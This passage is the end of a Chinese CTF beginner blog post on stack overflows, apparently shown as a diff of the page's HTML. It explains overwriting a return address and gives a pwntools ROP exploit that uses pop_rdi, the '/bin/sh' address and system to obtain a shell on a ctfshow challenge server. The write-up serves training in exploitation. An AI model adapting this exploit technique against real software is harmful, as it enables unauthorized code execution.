+<p>最终我们的目的就是通过栈溢出修改返回地址，以控制程序执行流程。它通过调用 pop_rdi 指令将bin_sh 的地址加载到寄存器rdi中，然后通过 ret 指令进行间接跳转，最终调用 system 函数，以执行system(“&#x2F;bin&#x2F;sh”)进而获得一个我们想要的shell。</p>
+<p>Exp:</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token number">28106</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/hsad/CTF/Challenge/ctfshow_pwn/pwn40"</span><span class="token punctuation">)</span>
+
+buf_offset <span class="token operator">=</span> <span class="token number">0xA</span><span class="token operator">+</span><span class="token number">0x8</span>
+system <span class="token operator">=</span> <span class="token number">0x0400520</span>
+bin_sh <span class="token operator">=</span> <span class="token number">0x0400808</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x04007e3</span>
+ret <span class="token operator">=</span> <span class="token number">0x0400674</span>
+payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>buf_offset<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"bit"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Hsad</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn入门-栈溢出">https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/11/30/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-4/" rel="prev" title="JAVA安全基础-- URLDNS链分析利用"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">JAVA安全基础-- URLDNS链分析利用</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/13/2024BuildCTF/" rel="next" title="2024BuildCTF"><span class="post-nav-text">2024BuildCTF</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Hsad</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-support"><span>本网站由</span><a class="footer-support-logo" href="https://www.dkdun.cn/" target="blank" title="林枫云"><img height="30" src="https://www.dkdun.cn/themes/web/www/upload/local673d5fc9c789c.png" alt="林枫云"></a><span>提供赞助</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
